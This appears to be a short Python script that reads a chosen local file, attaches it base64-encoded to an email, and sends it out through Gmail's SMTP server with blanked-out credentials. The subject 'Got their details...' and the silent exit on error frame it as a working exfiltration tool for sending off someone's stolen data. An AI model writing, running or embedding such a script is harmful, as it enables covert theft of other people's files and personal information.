import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

message = MIMEMultipart()
message["From"] = "<redacted>"
message["To"] = "<redacted>"
message["Subject"] = "Got their details..."

filename = "hello.txt" # File you want

try:
    attachment = open(filename, "rb")
except Exception:
    exit()

f_content = MIMEBase("application", "octet-stream")
f_content.set_payload(attachment.read())

encoders.encode_base64(f_content)
f_content.add_header("Content-Disposition", f"attachment; filename = {filename}")

message.attach(f_content)

s = smtplib.SMTP("smtp.gmail.com", 587)
s.ehlo()
s.starttls()
s.login("<redacted>", "<redacted>")
s.sendmail("<redacted>", "<redacted>", message.as_string())
s.close() 